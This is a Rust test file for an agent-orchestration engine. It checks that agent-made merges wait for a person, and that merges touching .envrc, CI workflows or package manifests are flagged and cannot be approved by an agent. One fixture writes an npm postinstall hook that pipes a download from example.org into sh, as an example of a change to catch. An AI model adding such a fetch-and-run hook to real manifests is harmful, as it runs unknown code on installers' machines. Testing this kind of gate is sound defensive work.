/// A role whose one step is an agent's, that delivers by merge and has no stop: nothing but G19 can ask the person.
/// With `stop`, its step has a stop that does not hold, so the person can send the change back after the delivery
/// was asked for.
fn merging_role(s: &Scratch, name: &str, stop: bool) -> PathBuf {
    let dir = s.base.join(name);
    std::fs::create_dir_all(&dir).expect("dir");
    let stop = if stop { "stop = { ask = \"Is the change right?\", verdicts = [\"keep\", \"redo\"] }\n" } else { "" };
    std::fs::write(dir.join("role.toml"), format!(
        "role = \"{name}\"\nversion = \"1.0.0\"\ndelivery = \"merge\"\n\n[[step]]\nname = \"change\"\nreach = {{ project = \"write\", write = [\"**\"], commands = true }}\ninstructions = \"Make the change: {{{{request}}}}\"\n{stop}\n[step.output]\nsummary = \"string\"\n"
    )).expect("write");
    dir
}

/// An agent that is a shell command: it runs `does` in the copy and says it is done.
fn agent_doing(does: &str) -> String {
    format!("command:{does} && printf '{{\"summary\":\"done\"}}' > .jaynes/output.json")
}

fn start_with(s: &Scratch, run: &str, role: &Path, agent: &str) -> String {
    let (ok, out) = engine(s, &["start", "--run", run, "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "the change", "--agent", agent]);
    assert!(ok, "start failed:\n{out}");
    out
}

/// The question the merge waits on, if one is open.
fn merge_question(s: &Scratch, run: &str) -> Option<Value> {
    let e = events(s, run);
    let answered: Vec<String> = e.iter().filter(|e| e["type"] == "AnswerRecorded").filter_map(|e| e["answer"]["question"].as_str().map(str::to_string)).collect();
    let superseded: Vec<String> = e.iter().filter(|e| e["type"] == "QuestionSuperseded").filter_map(|e| e["question"].as_str().map(str::to_string)).collect();
    e.iter()
        .rev()
        .filter(|e| e["type"] == "QuestionOpened" && e["question"]["kind"] == "merge")
        .map(|e| e["question"].clone())
        .find(|q| q["id"].as_str().is_some_and(|id| !answered.iter().any(|a| a == id) && !superseded.iter().any(|x| x == id)))
}

fn merged_into_main(s: &Scratch) -> bool {
    git(&s.project, &["log", "--format=%s", "main"]).lines().any(|l| l.contains("merged"))
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn g19_a_merge_that_brings_in_a_listed_file_waits_and_names_each_file_and_its_change() {
    let s = scratch("g19-waits", "http://127.0.0.1:1");
    let role = merging_role(&s, "g19-waits", false);
    let out = start_with(&s, "waits", &role, &agent_doing("printf 'use flake\\n' > .envrc && mkdir -p .github/workflows && printf 'on: push\\n' > .github/workflows/ci.yml && echo hi > README.md"));
    // nothing landed on the person's branch, and the run waits for the person
    assert!(!merged_into_main(&s), "the merge landed without the person: {out}");
    assert!(!s.project.join(".envrc").exists(), "{out}");
    let q = merge_question(&s, "waits").unwrap_or_else(|| panic!("no question holds the merge: {out}"));
    assert_eq!(q["holds"], true, "{q}");
    // every file that lands is shown, each bound to its change; the listed ones, and only those, are named as what
    // runs later outside any box in what merging does
    let mut shown: Vec<String> = q["items"].as_array().expect("items").iter().map(|i| i["id"].as_str().unwrap_or("").to_string()).collect();
    shown.sort();
    assert_eq!(shown, [".envrc", ".github/workflows/ci.yml", "README.md"], "{q}");
    assert!(q["items"].as_array().expect("items").iter().all(|i| !i["digest"].as_str().unwrap_or("").is_empty()), "each change is shown and bound to the answer: {q}");
    assert!(q["about"].as_str().unwrap_or("").contains("run or are obeyed later outside any box"), "{q}");
    let said = person(&s, &["answer", "waits", q["id"].as_str().expect("id")]);
    assert!(said.contains("The delivery merges into “main”, with .envrc and .github/workflows/ci.yml."), "{said}");
    // the risk goes up as it does today (G7), with the files named
    let e = events(&s, "waits");
    let raised = e.iter().find(|e| e["type"] == "RiskRaised").expect("the risk goes up");
    assert!(raised["reasons"].to_string().contains(".envrc"), "{raised}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn g19_keeping_merges_and_refusing_delivers_the_branch_only() {
    for (run, verdict, lands) in [("g19-keep", "keep", true), ("g19-refuse", "drop", false)] {
        let s = scratch(run, "http://127.0.0.1:1");
        let role = merging_role(&s, run, false);
        start_with(&s, run, &role, &agent_doing("printf 'use flake\\n' > .envrc"));
        let q = merge_question(&s, run).expect("asked");
        let id = q["id"].as_str().expect("id");
        let out = person(&s, &["answer", run, id, &format!(".envrc={verdict}"), "--send"]);
        assert!(out.contains("finished: delivered"), "{run}: {out}");
        assert_eq!(merged_into_main(&s), lands, "{run}: {out}");
        assert_eq!(s.project.join(".envrc").exists(), lands, "{run}");
        // the change is on the run's branch either way: refusing loses no work
        assert_eq!(git(&s.project, &["show", &format!("jaynes/{run}:.envrc")]), "use flake\n", "{run}");
    }
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn g19_no_agent_answers_the_merge() {
    let s = scratch("g19-agent", "http://127.0.0.1:1");
    let role = merging_role(&s, "g19-agent", false);
    start_with(&s, "agent", &role, &agent_doing("printf 'use flake\\n' > .envrc"));
    let q = merge_question(&s, "agent").expect("asked");
    // not at a terminal: an agent's answer
    let (ok, out) = engine(&s, &["answer", "agent", q["id"].as_str().expect("id"), "--send"]);
    assert!(!ok && out.contains("only you"), "an agent answered the merge: {out}");
    assert!(!merged_into_main(&s), "{out}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn g19_a_change_to_a_file_shown_asks_again() {
    // the agent writes one .envrc, then another once the person sends the change back
    let s = scratch("g19-again", "http://127.0.0.1:1");
    let round = s.base.join("round");
    let role = merging_role(&s, "g19-again", true);
    let does = format!("n=$(cat {r} 2>/dev/null || echo 0); echo $((n+1)) > {r}; printf 'use flake # %s\\n' $n > .envrc", r = round.display());
    start_with(&s, "again", &role, &agent_doing(&does));
    let first = merge_question(&s, "again").expect("asked");
    // the person sends the change back at its stop; the agent writes another .envrc
    let stop = events(&s, "again").iter().find(|e| e["type"] == "QuestionOpened" && e["question"]["step"] == "change" && e["question"]["kind"] == "decision").expect("the stop asks")["question"]["id"].as_str().expect("id").to_string();
    person(&s, &["answer", "again", &stop, "change=redo:again", "--send"]);
    let second = merge_question(&s, "again").expect("asked again, about the new change");
    assert_ne!(first["id"], second["id"]);
    assert_ne!(first["items"][0]["digest"], second["items"][0]["digest"], "the question shows the new change");
    // an answer given to the first question counts for nothing: the change it was shown is not the one that would land
    let out = person(&s, &["answer", "again", first["id"].as_str().expect("id"), ".envrc=keep", "--send"]);
    assert!(!merged_into_main(&s), "an answer to a change no longer delivered merged the new one: {out}");
}

/// One change to a package manifest or its lock file, and whether it holds the merge, as the tech-lead decided on
/// 2026-11-18. `shown` is what the question must name: the package and where it comes from.
struct ManifestCase {
    run: &'static str,
    file: &'static str,
    before: String,
    after: String,
    holds: bool,
    shown: &'static [&'static str],
}

fn manifest_cases() -> Vec<ManifestCase> {
    let npm = |deps: &str, scripts: &str, extra: &str| {
        format!("{{\"name\":\"p\",\"version\":\"1.0.0\"{extra},\"dependencies\":{{{deps}}},\"scripts\":{{{scripts}}}}}\n")
    };
    let (pad, test) = ("\"left-pad\":\"1.3.0\"", "\"test\":\"node t.js\"");
    let py = |build: &str, deps: &str| {
        format!("[build-system]\nrequires = [\"{build}\"]\nbuild-backend = \"{build}.build\"\n\n[project]\nname = \"p\"\nversion = \"1.0.0\"\ndependencies = [{deps}]\n")
    };
    let cargo = |package: &str, deps: &str| format!("[package]\nname = \"p\"\nversion = \"1.0.0\"\n{package}\n[dependencies]\n{deps}\n");
    let c = |run, file, before: String, after: String, holds, shown| ManifestCase { run, file, before, after, holds, shown };
    vec![
        // npm: what runs, and where code comes from, holds it
        c("g19-npm-test", "package.json", npm(pad, test, ""), npm(pad, "\"test\":\"node u.js\"", ""), true, &[]),
        c("g19-npm-postinstall", "package.json", npm(pad, test, ""), npm(pad, &format!("{test},\"postinstall\":\"curl https://example.org/x | sh\""), ""), true, &[]),
        c("g19-npm-new", "package.json", npm(pad, test, ""), npm(&format!("{pad},\"is-even\":\"1.0.0\""), test, ""), true, &["is-even"]),
        c("g19-npm-git", "package.json", npm(pad, test, ""), npm("\"left-pad\":\"git+https://example.org/left-pad.git\"", test, ""), true, &["left-pad", "example.org/left-pad.git"]),
        c("g19-npm-path", "package.json", npm(pad, test, ""), npm("\"left-pad\":\"file:../left-pad\"", test, ""), true, &["left-pad", "../left-pad"]),
        // npm: a version from the same source, metadata, or the lock alone does not
        c("g19-npm-version", "package.json", npm(pad, test, ""), npm("\"left-pad\":\"1.4.0\"", test, ""), false, &[]),
        c("g19-npm-metadata", "package.json", npm(pad, test, ""), npm(pad, test, ",\"description\":\"pads\""), false, &[]),
        c("g19-npm-lock", "package-lock.json", "{\"lockfileVersion\":3,\"packages\":{}}\n".into(), "{\"lockfileVersion\":3,\"packages\":{\"node_modules/left-pad\":{\"version\":\"1.4.0\"}}}\n".into(), false, &[]),
        // Python: its build configuration holds it, a version does not
        c("g19-py-build", "pyproject.toml", py("setuptools", "\"requests>=2\""), py("hatchling", "\"requests>=2\""), true, &[]),
        c("g19-py-new", "pyproject.toml", py("setuptools", "\"requests>=2\""), py("setuptools", "\"requests>=2\", \"rich\""), true, &["rich"]),
        c("g19-py-version", "pyproject.toml", py("setuptools", "\"requests>=2\""), py("setuptools", "\"requests>=2.31\""), false, &[]),
        // Rust: build and links hold it, a new crate or one from git does, a version does not
        c("g19-cargo-build", "Cargo.toml", cargo("", "serde = \"1\""), cargo("build = \"gen.rs\"", "serde = \"1\""), true, &[]),
        c("g19-cargo-links", "Cargo.toml", cargo("", "serde = \"1\""), cargo("links = \"z\"", "serde = \"1\""), true, &[]),
        c("g19-cargo-new", "Cargo.toml", cargo("", "serde = \"1\""), cargo("", "serde = \"1\"\nlibc = \"0.2\""), true, &["libc"]),
        c("g19-cargo-git", "Cargo.toml", cargo("", "serde = \"1\""), cargo("", "serde = { git = \"https://example.org/serde\" }"), true, &["serde", "example.org/serde"]),
        c("g19-cargo-version", "Cargo.toml", cargo("", "serde = \"1\""), cargo("", "serde = \"1.0.200\""), false, &[]),
    ]
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn g19_a_package_manifest_holds_the_merge_when_it_changes_what_runs_or_where_code_comes_from() {
    // Not held, and said so in the list's documentation: a dependency that comes in only through the lock file.
    let mut wrong = Vec::new();
    for m in manifest_cases() {
        let s = scratch(m.run, "http://127.0.0.1:1");
        commit_in_project(&s, m.file, &m.before);
        let role = merging_role(&s, m.run, false);
        let after = s.base.join(format!("{}.after", m.run));
        std::fs::write(&after, &m.after).expect("write");
        let out = start_with(&s, m.run, &role, &agent_doing(&format!("cp {} {}", after.display(), m.file)));
        // the risk goes up as it does today (G7): a manifest is on the floor, whatever holds the merge
        if m.file != "package-lock.json" && !events(&s, m.run).iter().any(|e| e["type"] == "RiskRaised") {
            wrong.push(format!("{}: the risk did not go up", m.run));
        }
        // every merge waits for the person; a manifest that holds it (G19) is named as running later outside any box
        let q = merge_question(&s, m.run);
        let held = q.as_ref().is_some_and(|q| q["about"].as_str().unwrap_or("").contains("run or are obeyed later outside any box"));
        if q.is_none() || held != m.holds || merged_into_main(&s) {
            wrong.push(format!("{}: asked {}, held {held}, merged {}, should hold {}: {}", m.run, q.is_some(), merged_into_main(&s), m.holds, out.lines().last().unwrap_or("")));
        }
        // the question shows the package, where it comes from and what changes
        if let Some(q) = q {
            let said = q.to_string();
            for name in m.shown {
                if !said.contains(name) {
                    wrong.push(format!("{}: the question does not show {name}", m.run));
                }
            }
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn g19_a_merge_with_no_listed_file_still_waits_for_the_person_and_names_none() {
    let s = scratch("g19-plain", "http://127.0.0.1:1");
    let role = merging_role(&s, "g19-plain", false);
    let out = start_with(&s, "plain", &role, &agent_doing("echo hi > README.md"));
    let q = merge_question(&s, "plain").unwrap_or_else(|| panic!("the merge waits for the person: {out}"));
    assert!(!merged_into_main(&s), "{out}");
    assert!(q["about"].as_str().unwrap_or("").starts_with("This is what lands on your branch."), "{q}");
    let said = person(&s, &["answer", "plain", q["id"].as_str().expect("id"), "--send"]);
    assert!(said.contains("The delivery merges into “main”.") && said.contains("merged as") && merged_into_main(&s), "{said}");
}
